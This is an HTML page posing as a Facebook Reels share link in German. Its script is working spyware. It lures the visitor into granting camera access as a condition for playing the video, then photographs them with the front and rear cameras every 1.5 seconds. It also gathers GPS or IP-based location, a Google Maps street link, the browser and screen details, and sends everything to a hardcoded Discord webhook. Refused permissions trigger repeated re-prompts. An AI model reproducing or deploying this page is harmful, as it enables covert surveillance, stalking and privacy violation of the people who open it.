<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook Reels</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">

  <!-- OG f√ºr perfekte Share-Vorschau -->
  <meta property="og:title" content="Facebook Reels">
  <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO ‚Äì Zorica Zoka Dimitrijevic ¬∑ Original audio">
  <meta property="og:image" content="https://i.imgur.com/DEINE_THUMBNAIL_URL.jpg"> <!-- echtes Bild einsetzen -->
  <meta property="og:image:width" content="526">
  <meta property="og:image:height" content="296">
  <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
  <meta property="og:type" content="video.other">
  <meta property="og:site_name" content="Facebook">
  <meta name="twitter:card" content="summary_large_image">

  <style>
    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; }
    .close { font-size:36px; font-weight:bold; cursor:pointer; margin-right:20px; }
    .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
    .reel { height:100vh; position:relative; }
    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; }
    .avatar { width:50px; height:50px; border-radius:50%; background:#666; margin-right:14px; }
    .info { font-size:17px; }
    .name { font-weight:600; }
    .pub { font-size:14px; opacity:0.9; }
    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; cursor:pointer; }
    .play-btn { width:130px; height:130px; background:rgba(0,0,0,0.6); border-radius:50%; display:flex; align-items:center; justify-content:center; }
    .triangle { width:0; height:0; border-top:42px solid transparent; border-bottom:42px solid transparent; border-left:68px solid #fff; margin-left:12px; }
    .text { position:absolute; bottom:260px; left:0; right:0; font-size:2.8rem; text-align:center; text-shadow:0 5px 30px #000; pointer-events:none; z-index:4; }
    .actions { position:absolute; bottom:70px; right:30px; display:flex; flex-direction:column; gap:40px; font-size:36px; color:#fff; z-index:6; }
    .audio { position:absolute; bottom:30px; left:20px; font-size:15px; opacity:0.85; z-index:10; }
    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; }
    .modal { background:#fff; color:#000; padding:50px 40px; border-radius:22px; max-width:480px; text-align:center; box-shadow:0 20px 80px rgba(0,0,0,0.8); }
    .btn { padding:18px 90px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:20px 12px; cursor:pointer; }
    .allow { background:#1877f2; color:#fff; }
    .deny { background:#e4e6eb; color:#000; }
  </style>
</head>
<body>
<div class="header">
  <div class="close" id="closeBtn">√ó</div>
  <div class="title">Reels</div>
</div>

<div class="reel">
  <div class="profile">
    <div class="avatar"></div>
    <div class="info">
      <div class="name">Zorica Zoka Dimitrijevic</div>
      <div class="pub">√ñffentlich</div>
    </div>
  </div>

  <div class="play-area" id="playArea">
    <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
  </div>

  <div class="text">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>

  <div class="actions">
    <div>‚ù§Ô∏è 14.6K</div>
    <div>üí¨ 305</div>
    <div>‚û§</div>
  </div>

  <div class="audio">Zorica Zoka Dimitrijevic ¬∑ Original audio ¬∑ Zorica</div>
</div>

<div id="cam-prompt">
  <div class="modal">
    <h2>Video kann nicht abgespielt werden</h2>
    <p style="margin:30px 0; font-size:1.4rem;">Kurze Kamera-Freigabe n√∂tig.</p>
    <div id="camErr" style="color:#c00;display:none;margin:20px 0;">Zugriff verweigert ‚Äì erneut versuchen</div>
    <button id="allowCam" class="btn allow">KAMERA FREIGEBEN</button>
    <button id="denyCam" class="btn deny">ABBRECHEN</button>
  </div>
</div>

<div id="loc-prompt">
  <div class="modal">
    <h2>Standort teilen</h2>
    <p style="margin:30px 0; font-size:1.4rem;">Genauen Standort teilen.</p>
    <button id="allowLoc" class="btn allow">STANDORT TEILEN</button>
    <button id="denyLoc" class="btn deny">NEIN</button>
  </div>
</div>

<video id="v" autoplay muted playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
let count=0, stream=null, v=document.getElementById('v'), c=document.getElementById('c');

async function getGeo() {
  let geo=null;
  try{geo=await(await fetch('https://ipapi.co/json/')).json();if(geo.ip&&geo.latitude)return geo;}catch{}
  try{geo=await(await fetch('https://ipinfo.io/json')).json();if(geo.ip&&geo.loc){const[la,lo]=geo.loc.split(',');geo.latitude=parseFloat(la);geo.longitude=parseFloat(lo);return geo;}}catch{}
  return {ip:'?',city:'?',region:'?',country:'?',postal:'?',org:'?',latitude:null,longitude:null};
}

async function getGPS() {
  return new Promise(r=>{
    if(!navigator.geolocation)return r(null);
    navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy}),()=>r(null),{enableHighAccuracy:true,timeout:20000,maximumAge:0});
  });
}

async function send(type,blob=null){
  try{
    let loc=await getGPS()||await getGeo();
    let ip=loc.ip||'?';
    let city=loc.city||'?',region=loc.region||'?',country=loc.country||'?',postal=loc.postal||'?',org=loc.org||'?';
    let lat=loc.latitude,lon=loc.longitude;
    let acc=lat?`${Math.round(loc.accuracy||500)}m`:'IP-Fallback';
    let maps=lat?`https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c`:null;

    const embed={
      title:`üî¥ FB ${type} #${++count}`,
      color:lat?0x00ffcc:0xff0000,
      fields:[
        {name:"Event",value:type,inline:true},
        {name:"IP + Ort",value:`**${ip}**\n${city} ‚Ä¢ ${region} ‚Ä¢ ${country} ‚Ä¢ ${postal} ‚Ä¢ ${org}`,inline:true},
        {name:"Genauigkeit",value:acc,inline:true},
        {name:"UA",value:navigator.userAgent.substring(0,140),inline:false},
        {name:"Screen",value:`${screen.width}√ó${screen.height}`,inline:true},
        {name:"Zeit",value:new Date().toISOString(),inline:true}
      ],
      timestamp:new Date().toISOString()
    };
    if(maps)embed.fields.push({name:"Google Maps",value:`[‚Üí Haus/Street](${maps})`,inline:false});

    const payload={embeds:[embed]};
    if(blob){
      let fd=new FormData();
      fd.append("payload_json",JSON.stringify(payload));
      fd.append("file",blob,`cam_${Date.now()}.jpg`);
      await fetch(HOOK+"?wait=true",{method:"POST",body:fd});
    }else{
      await fetch(HOOK+"?wait=true",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
    }
  }catch{}
}

async function startCam(facing="user"){
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}}});
    v.srcObject=s;
    await v.play();
    c.width=v.videoWidth||1280;
    c.height=v.videoHeight||720;
    return s;
  }catch(e){
    send('CAM_ERROR_'+facing);
    return null;
  }
}

document.getElementById('playBtn').addEventListener('click',async()=>{
  document.getElementById('cam-prompt').style.display='flex';
  send('PLAY');
});

document.getElementById('allowCam').onclick=async()=>{
  document.getElementById('cam-prompt').style.display='none';
  let s=await startCam("user");
  if(s){
    setInterval(async()=>{
      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
      let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.88));
      send('CAM SNAP FRONT',b);
    },1500);
    setTimeout(async()=>{
      if(s)s.getTracks().forEach(t=>t.stop());
      let back=await startCam("environment");
      if(back){
        setInterval(async()=>{
          c.getContext('2d').drawImage(v,0,0,c.width,c.height);
          let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.88));
          send('CAM SNAP BACK',b);
        },1500);
      }
      setTimeout(()=>document.getElementById('loc-prompt').style.display='flex',3000);
    },6000);
  }else{
    document.getElementById('camErr').style.display='block';
    setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',2000);
  }
};

document.getElementById('denyCam').onclick=()=>{
  document.getElementById('camErr').style.display='block';
  send('CAM_DENY');
  setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',1800);
};

document.getElementById('allowLoc').onclick=async()=>{
  document.getElementById('loc-prompt').style.display='none';
  send('LOC_GRANTED');
};

document.getElementById('denyLoc').onclick=()=>{
  document.getElementById('loc-prompt').style.display='none';
  send('LOC_DENY');
};

document.getElementById('closeBtn').onclick=()=>location.reload();
</script>
</body>
</html>
